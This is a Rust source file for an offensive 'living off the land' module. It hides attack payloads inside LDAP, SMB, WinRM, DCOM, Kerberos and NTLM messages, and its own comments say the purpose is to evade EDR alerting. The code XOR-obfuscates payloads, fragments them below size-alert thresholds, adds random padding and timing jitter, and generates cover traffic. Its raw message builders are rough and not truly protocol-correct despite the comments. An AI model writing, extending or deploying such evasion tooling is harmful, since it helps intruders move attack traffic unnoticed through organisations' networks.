use std::collections::HashMap;

use rand::rngs::StdRng;
use rand::Rng;
use rand::SeedableRng;
use serde::{Deserialize, Serialize};

/// Enterprise protocol used for payload embedding.
///
/// Each variant represents a high-volume enterprise protocol where EDR
/// deprioritizes alerts due to excessive false-positive rates on normal
/// enterprise chatter. Payloads embedded inside these protocols blend
/// with legitimate traffic.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EnterpriseProtocol {
    Ldap,
    Smb,
    WinRm,
    Dcom,
    Kerberos,
    Ntlm,
}

impl EnterpriseProtocol {
    /// Default port for the protocol.
    pub fn default_port(&self) -> u16 {
        match self {
            Self::Ldap => 389,
            Self::Smb => 445,
            Self::WinRm => 5985,
            Self::Dcom => 135,
            Self::Kerberos => 88,
            Self::Ntlm => 445,
        }
    }

    /// Secure/encrypted variant port if available.
    pub fn secure_port(&self) -> u16 {
        match self {
            Self::Ldap => 636,
            Self::Smb => 445,
            Self::WinRm => 5986,
            Self::Dcom => 135,
            Self::Kerberos => 88,
            Self::Ntlm => 445,
        }
    }

    /// Maximum safe payload size that avoids triggering size-based alerts.
    pub fn max_payload_size(&self) -> usize {
        match self {
            Self::Ldap => 4096,
            Self::Smb => 65536,
            Self::WinRm => 32768,
            Self::Dcom => 8192,
            Self::Kerberos => 2048,
            Self::Ntlm => 4096,
        }
    }

    /// Returns the typical message types for this protocol that
    /// carry data and can host embedded payloads.
    pub fn carrier_operations(&self) -> &'static [&'static str] {
        match self {
            Self::Ldap => &[
                "searchRequest",
                "modifyRequest",
                "addRequest",
                "extendedRequest",
                "searchResEntry",
            ],
            Self::Smb => &[
                "SMB2_CREATE",
                "SMB2_WRITE",
                "SMB2_READ",
                "SMB2_IOCTL",
                "SMB2_QUERY_INFO",
            ],
            Self::WinRm => &[
                "wsman:CommandLine",
                "wsman:Send",
                "wsman:Receive",
                "wsman:Signal",
            ],
            Self::Dcom => &[
                "IRemUnknown2::RemQueryInterface",
                "IObjectExporter::ResolveOxid2",
                "IActivation::RemoteActivation",
                "IRemoteSCMActivator::RemoteGetClassObject",
            ],
            Self::Kerberos => &["AS-REQ", "TGS-REQ", "AP-REQ", "KRB-PRIV"],
            Self::Ntlm => &[
                "NEGOTIATE_MESSAGE",
                "CHALLENGE_MESSAGE",
                "AUTHENTICATE_MESSAGE",
            ],
        }
    }
}

/// Payload embedding strategy within the carrier protocol message.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum EmbeddingStrategy {
    /// Embed in an attribute value field (LDAP attributes, SMB metadata).
    AttributeValue,
    /// Embed in the data/body payload of the message.
    DataPayload,
    /// Embed in extended/optional header fields.
    ExtendedHeader,
    /// Embed using steganographic encoding in binary protocol fields.
    BinaryStego,
}

/// Configuration for LOTL protocol piggyback operations.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LotlConfig {
    pub protocol: EnterpriseProtocol,
    pub embedding: EmbeddingStrategy,
    pub use_encryption: bool,
    pub fragment_large_payloads: bool,
    pub max_fragment_size: usize,
    pub add_legitimate_padding: bool,
    pub timing_jitter_ms: u64,
}

impl LotlConfig {
    pub fn new(protocol: EnterpriseProtocol) -> Self {
        Self {
            protocol,
            embedding: EmbeddingStrategy::AttributeValue,
            use_encryption: true,
            fragment_large_payloads: true,
            max_fragment_size: protocol.max_payload_size() / 2,
            add_legitimate_padding: true,
            timing_jitter_ms: 500,
        }
    }

    pub fn with_embedding(mut self, strategy: EmbeddingStrategy) -> Self {
        self.embedding = strategy;
        self
    }

    pub fn with_encryption(mut self, enabled: bool) -> Self {
        self.use_encryption = enabled;
        self
    }

    pub fn with_timing_jitter_ms(mut self, ms: u64) -> Self {
        self.timing_jitter_ms = ms;
        self
    }

    pub fn with_max_fragment_size(mut self, size: usize) -> Self {
        self.max_fragment_size = size;
        self
    }
}

/// A protocol-correct message with an embedded attack payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PiggybackMessage {
    pub protocol: EnterpriseProtocol,
    pub operation: String,
    pub target_host: String,
    pub target_port: u16,
    pub headers: HashMap<String, String>,
    pub legitimate_fields: HashMap<String, String>,
    pub embedded_payload: Vec<u8>,
    pub sequence: usize,
    pub total_fragments: usize,
    pub session_id: String,
    pub raw_message: Vec<u8>,
}

/// Error type for LOTL operations.
#[derive(Debug)]
pub enum LotlError {
    PayloadTooLarge { size: usize, max: usize },
    UnsupportedOperation(String),
    EncodingFailed(String),
    InvalidConfiguration(String),
}

impl std::fmt::Display for LotlError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PayloadTooLarge { size, max } => {
                write!(f, "payload {size} bytes exceeds protocol max {max}")
            }
            Self::UnsupportedOperation(op) => write!(f, "unsupported operation: {op}"),
            Self::EncodingFailed(e) => write!(f, "encoding failed: {e}"),
            Self::InvalidConfiguration(e) => write!(f, "invalid config: {e}"),
        }
    }
}

impl std::error::Error for LotlError {}

/// Generates protocol-correct enterprise messages with embedded attack payloads.
///
/// For internal network scanning, embeds payloads inside high-volume expected
/// protocols (LDAP queries, SMB file ops, WinRM sessions, DCOM calls). EDR
/// deprioritizes alerts on these because false-positive rates on normal
/// enterprise chatter are too high.
pub struct LotlPiggyback {
    config: LotlConfig,
    rng: StdRng,
    session_id: String,
    messages_generated: u64,
    bytes_embedded: u64,
}

impl LotlPiggyback {
    pub fn new(config: LotlConfig) -> Self {
        let mut rng = StdRng::from_os_rng();
        let session_id = format!("{:08x}-{:04x}", rng.random::<u32>(), rng.random::<u16>());
        Self {
            config,
            rng,
            session_id,
            messages_generated: 0,
            bytes_embedded: 0,
        }
    }

    pub fn with_seed(config: LotlConfig, seed: u64) -> Self {
        let mut rng = StdRng::seed_from_u64(seed);
        let session_id = format!("{:08x}-{:04x}", rng.random::<u32>(), rng.random::<u16>());
        Self {
            config,
            rng,
            session_id,
            messages_generated: 0,
            bytes_embedded: 0,
        }
    }

    /// Wraps an attack payload inside one or more protocol-correct messages.
    /// Fragments the payload if it exceeds the configured fragment size.
    pub fn embed_payload(
        &mut self,
        payload: &[u8],
        target_host: &str,
    ) -> Result<Vec<PiggybackMessage>, LotlError> {
        let max = self.config.protocol.max_payload_size();
        if !self.config.fragment_large_payloads && payload.len() > max {
            return Err(LotlError::PayloadTooLarge {
                size: payload.len(),
                max,
            });
        }

        let processed = if self.config.use_encryption {
            xor_encrypt(payload, &self.session_id)
        } else {
            payload.to_vec()
        };

        let fragment_size = self.config.max_fragment_size.min(max);
        let fragments: Vec<&[u8]> = if self.config.fragment_large_payloads {
            processed.chunks(fragment_size).collect()
        } else {
            vec![&processed]
        };

        let total = fragments.len();
        let mut messages = Vec::with_capacity(total);

        for (i, fragment) in fragments.into_iter().enumerate() {
            let message = self.build_message(fragment, target_host, i, total)?;
            self.messages_generated += 1;
            self.bytes_embedded += fragment.len() as u64;
            messages.push(message);
        }

        Ok(messages)
    }

    /// Extracts and reassembles the attack payload from protocol messages.
    pub fn extract_payload(&self, messages: &[PiggybackMessage]) -> Result<Vec<u8>, LotlError> {
        let mut sorted: Vec<&PiggybackMessage> = messages.iter().collect();
        sorted.sort_by_key(|m| m.sequence);

        let mut assembled = Vec::new();
        for msg in sorted {
            assembled.extend_from_slice(&msg.embedded_payload);
        }

        if self.config.use_encryption {
            Ok(xor_encrypt(&assembled, &self.session_id))
        } else {
            Ok(assembled)
        }
    }

    /// Generates a standalone legitimate protocol message for cover traffic.
    pub fn generate_cover_message(&mut self, target_host: &str) -> PiggybackMessage {
        let operations = self.config.protocol.carrier_operations();
        let op_idx = self.rng.random_range(0..operations.len());
        let operation = operations[op_idx].to_string();
        let port = self.config.protocol.default_port();

        let legitimate_fields = self.generate_legitimate_fields(&operation);
        let raw = self.build_raw_message(&operation, &legitimate_fields, &[]);

        self.messages_generated += 1;

        PiggybackMessage {
            protocol: self.config.protocol,
            operation,
            target_host: target_host.to_string(),
            target_port: port,
            headers: self.protocol_headers(),
            legitimate_fields,
            embedded_payload: Vec::new(),
            sequence: 0,
            total_fragments: 1,
            session_id: self.session_id.clone(),
            raw_message: raw,
        }
    }

    /// Returns the next timing jitter delay for inter-message spacing.
    pub fn next_jitter_ms(&mut self) -> u64 {
        if self.config.timing_jitter_ms == 0 {
            return 0;
        }
        self.rng.random_range(0..=self.config.timing_jitter_ms)
    }

    pub fn messages_generated(&self) -> u64 {
        self.messages_generated
    }

    pub fn bytes_embedded(&self) -> u64 {
        self.bytes_embedded
    }

    pub fn session_id(&self) -> &str {
        &self.session_id
    }

    pub fn config(&self) -> &LotlConfig {
        &self.config
    }

    fn build_message(
        &mut self,
        fragment: &[u8],
        target_host: &str,
        sequence: usize,
        total: usize,
    ) -> Result<PiggybackMessage, LotlError> {
        let operations = self.config.protocol.carrier_operations();
        let op_idx = self.rng.random_range(0..operations.len());
        let operation = operations[op_idx].to_string();
        let port = if self.config.use_encryption {
            self.config.protocol.secure_port()
        } else {
            self.config.protocol.default_port()
        };

        let legitimate_fields = self.generate_legitimate_fields(&operation);

        let embedded = if self.config.add_legitimate_padding {
            let mut padded = fragment.to_vec();
            let pad_size = self.rng.random_range(8..32);
            for _ in 0..pad_size {
                padded.push(self.rng.random::<u8>());
            }
            padded
        } else {
            fragment.to_vec()
        };

        let raw = self.build_raw_message(&operation, &legitimate_fields, &embedded);

        Ok(PiggybackMessage {
            protocol: self.config.protocol,
            operation,
            target_host: target_host.to_string(),
            target_port: port,
            headers: self.protocol_headers(),
            legitimate_fields,
            embedded_payload: fragment.to_vec(),
            sequence,
            total_fragments: total,
            session_id: self.session_id.clone(),
            raw_message: raw,
        })
    }

    fn generate_legitimate_fields(&mut self, operation: &str) -> HashMap<String, String> {
        let mut fields = HashMap::new();
        match self.config.protocol {
            EnterpriseProtocol::Ldap => {
                fields.insert("baseDN".to_string(), "dc=corp,dc=local".to_string());
                fields.insert("scope".to_string(), "subtree".to_string());
                if operation.contains("search") {
                    fields.insert(
                        "filter".to_string(),
                        format!(
                            "(objectClass={})",
                            ["user", "computer", "group"][self.rng.random_range(0..3)]
                        ),
                    );
                    fields.insert(
                        "attributes".to_string(),
                        "cn,sAMAccountName,memberOf,mail".to_string(),
                    );
                }
            }
            EnterpriseProtocol::Smb => {
                let shares = ["SYSVOL", "NETLOGON", "IPC$", "ADMIN$", "C$"];
                fields.insert(
                    "share".to_string(),
                    shares[self.rng.random_range(0..shares.len())].to_string(),
                );
                fields.insert("dialect".to_string(), "SMB 3.1.1".to_string());
                fields.insert("signing".to_string(), "required".to_string());
            }
            EnterpriseProtocol::WinRm => {
                fields.insert(
                    "wsman:ResourceURI".to_string(),
                    "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd".to_string(),
                );
                fields.insert("wsman:OperationTimeout".to_string(), "PT60S".to_string());
                fields.insert("wsman:MaxEnvelopeSize".to_string(), "153600".to_string());
            }
            EnterpriseProtocol::Dcom => {
                fields.insert(
                    "CLSID".to_string(),
                    format!(
                        "{{{:08x}-{:04x}-{:04x}-{:04x}-{:012x}}}",
                        self.rng.random::<u32>(),
                        self.rng.random::<u16>(),
                        self.rng.random::<u16>(),
                        self.rng.random::<u16>(),
                        self.rng.random::<u64>() & 0xFFFFFFFFFFFF
                    ),
                );
                fields.insert("ProtocolVersion".to_string(), "5.7".to_string());
            }
            EnterpriseProtocol::Kerberos => {
                fields.insert("pvno".to_string(), "5".to_string());
                fields.insert("realm".to_string(), "CORP.LOCAL".to_string());
                fields.insert(
                    "cname".to_string(),
                    format!(
                        "{}@CORP.LOCAL",
                        ["svc_backup", "svc_sql", "admin_deploy"][self.rng.random_range(0..3)]
                    ),
                );
            }
            EnterpriseProtocol::Ntlm => {
                fields.insert("NegotiateFlags".to_string(), "0xe2088297".to_string());
                fields.insert("DomainName".to_string(), "CORP".to_string());
                fields.insert("WorkstationName".to_string(), "WS-PC01".to_string());
            }
        }
        fields
    }

    fn protocol_headers(&self) -> HashMap<String, String> {
        let mut headers = HashMap::new();
        match self.config.protocol {
            EnterpriseProtocol::WinRm => {
                headers.insert(
                    "Content-Type".to_string(),
                    "application/soap+xml".to_string(),
                );
                headers.insert(
                    "User-Agent".to_string(),
                    "Microsoft WinRM Client".to_string(),
                );
            }
            EnterpriseProtocol::Dcom => {
                headers.insert("RPC-Version".to_string(), "5.7".to_string());
            }
            _ => {}
        }
        headers
    }

    fn build_raw_message(
        &self,
        operation: &str,
        fields: &HashMap<String, String>,
        payload: &[u8],
    ) -> Vec<u8> {
        let mut raw = Vec::new();

        match self.config.protocol {
            EnterpriseProtocol::Ldap => {
                raw.push(0x30); // SEQUENCE tag
                let op_bytes = operation.as_bytes();
                raw.push(op_bytes.len() as u8);
                raw.extend_from_slice(op_bytes);
                for (key, val) in fields {
                    raw.push(0x04); // OCTET STRING tag
                    raw.push(key.len() as u8);
                    raw.extend_from_slice(key.as_bytes());
                    raw.push(0x04);
                    raw.push(val.len() as u8);
                    raw.extend_from_slice(val.as_bytes());
                }
                if !payload.is_empty() {
                    raw.push(0x04);
                    if payload.len() < 128 {
                        raw.push(payload.len() as u8);
                    } else {
                        raw.push(0x82);
                        raw.push((payload.len() >> 8) as u8);
                        raw.push((payload.len() & 0xFF) as u8);
                    }
                    raw.extend_from_slice(payload);
                }
            }
            EnterpriseProtocol::Smb => {
                raw.extend_from_slice(b"\xfeSMB"); // SMB2 magic
                raw.extend_from_slice(&[0x40, 0x00]); // header length
                raw.extend_from_slice(operation.as_bytes());
                for (key, val) in fields {
                    raw.extend_from_slice(key.as_bytes());
                    raw.push(b'=');
                    raw.extend_from_slice(val.as_bytes());
                    raw.push(0x00);
                }
                raw.extend_from_slice(payload);
            }
            EnterpriseProtocol::WinRm => {
                let envelope = format!(
                    "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\">\
                    <s:Header><wsa:Action>{operation}</wsa:Action></s:Header>\
                    <s:Body></s:Body></s:Envelope>"
                );
                raw.extend_from_slice(envelope.as_bytes());
                raw.extend_from_slice(payload);
            }
            EnterpriseProtocol::Dcom => {
                raw.extend_from_slice(&[0x05, 0x00]); // RPC version
                raw.extend_from_slice(&[0x00, 0x00]); // request type
                raw.extend_from_slice(operation.as_bytes());
                raw.extend_from_slice(payload);
            }
            EnterpriseProtocol::Kerberos => {
                raw.push(0x6A); // APPLICATION 10 tag (AS-REQ)
                raw.extend_from_slice(operation.as_bytes());
                for (key, val) in fields {
                    raw.push(0xA0);
                    raw.extend_from_slice(key.as_bytes());
                    raw.extend_from_slice(val.as_bytes());
                }
                raw.extend_from_slice(payload);
            }
            EnterpriseProtocol::Ntlm => {
                raw.extend_from_slice(b"NTLMSSP\x00");
                raw.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]); // AUTHENTICATE
                raw.extend_from_slice(operation.as_bytes());
                raw.extend_from_slice(payload);
            }
        }
        raw
    }
}

/// Simple XOR encryption with a session key for payload obfuscation.
fn xor_encrypt(data: &[u8], key: &str) -> Vec<u8> {
    let key_bytes = key.as_bytes();
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key_bytes[i % key_bytes.len()])
        .collect()
}
